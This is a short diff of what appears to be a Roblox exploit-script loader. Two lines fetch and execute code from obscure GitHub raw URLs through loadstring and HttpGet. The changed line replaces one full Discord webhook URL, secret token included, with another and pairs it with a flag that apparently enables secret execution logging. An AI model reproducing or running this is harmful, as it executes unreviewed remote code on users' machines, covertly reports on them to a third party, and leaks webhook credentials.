@@ -2,7 +2,7 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/hyjlkef/NINJA-ASSASSI
 -------------------------------------------------------------------------------------------------------------------------------------------
 loadstring(game:HttpGet('https://raw.githubusercontent.com/a2b4c6d8babyibigaymona/LADOIWAJIDOWADWADAW/refs/heads/main/AWFWA232F23F23D'))()
 -------------------------------------------------------------------------------------------------------------------------------------------
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1441442148808659005/duhqXWsWTAA4OMbERTz5xFRV-_ODZt1hBGFLLCynmAXcoW7lZ6xoJjIgEFeA5_R7QNDh"  -- Put your Webhook Url here
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1445033053473865801/xDTvfYs1VoeLQY-Y_6NR7zPYpSqbdw2ZFWrCPLjBeAlQCPSmxPgS-TvdtvBQVLqAzETW"  -- Put your Webhook Url here
 getgenv().ExecLogSecret = true
 
 local ui = gethui()
